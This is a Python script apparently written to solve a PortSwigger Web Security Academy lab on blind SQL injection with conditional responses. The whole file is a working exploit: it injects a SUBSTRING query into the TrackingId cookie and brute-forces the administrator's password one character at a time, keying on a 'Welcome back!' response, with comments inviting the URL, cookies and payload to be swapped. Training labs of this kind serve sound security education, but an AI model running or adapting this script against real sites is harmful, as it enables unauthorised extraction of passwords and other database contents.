# This python script can be used to extract information from a database with conditional responses
# Portswigger Lab - https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

import requests
from requests.structures import CaseInsensitiveDict
import string


# Update the URL value as needed
url = "https://0a25006104bda9db8343a52400fb00fb.web-security-academy.net/filter?category=Gifts"
headers = CaseInsensitiveDict()

leaked_data = list("")

while True:
    for character in string.printable:
        print("Extracted Data:  " + "".join(leaked_data))
        print("Character currently testing:  " + character)

        position = len(leaked_data) + 1

        # The vulnerable parameter to Blind SQL is a cookie value, this is using the f string to update the position and character automatically
        # Update theTrackingId and Session Cookies or SQL payload/query as needed
        headers[
            "Cookie"
        ] = f"TrackingId=4blbaP6TWj27CtrL' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{character}; session=c5lYUsCn3x1V3Gy2z5lq0thiisZlftri"

        resp = requests.get(url, headers=headers)

        response_data = resp.text

        # Update the conditional response data as needed
        if "Welcome back!" in response_data:
            leaked_data.append(character)
            break
